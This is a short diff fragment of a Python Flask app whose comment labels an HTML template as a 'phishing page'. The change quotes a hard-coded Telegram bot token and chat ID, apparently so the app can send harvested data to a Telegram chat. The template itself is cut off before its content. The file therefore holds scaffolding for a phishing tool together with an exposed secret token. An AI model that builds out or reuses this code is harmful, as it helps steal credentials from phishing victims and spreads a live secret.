@@ -7,8 +7,8 @@ import geocoder
 app = Flask(__name__)
 
 # Configuration
-TELEGRAM_TOKEN = os.environ.get(8761461166:AAGJSUvTctDDs0j7kKCIC-gY-7cc2WMnYvM)
-CHAT_ID = os.environ.get(6866229974)
+TELEGRAM_TOKEN = os.environ.get("8761461166:AAGJSUvTctDDs0j7kKCIC-gY-7cc2WMnYvM")
+CHAT_ID = os.environ.get("6866229974")
 
 # HTML template for phishing page
 HTML_TEMPLATE = '''
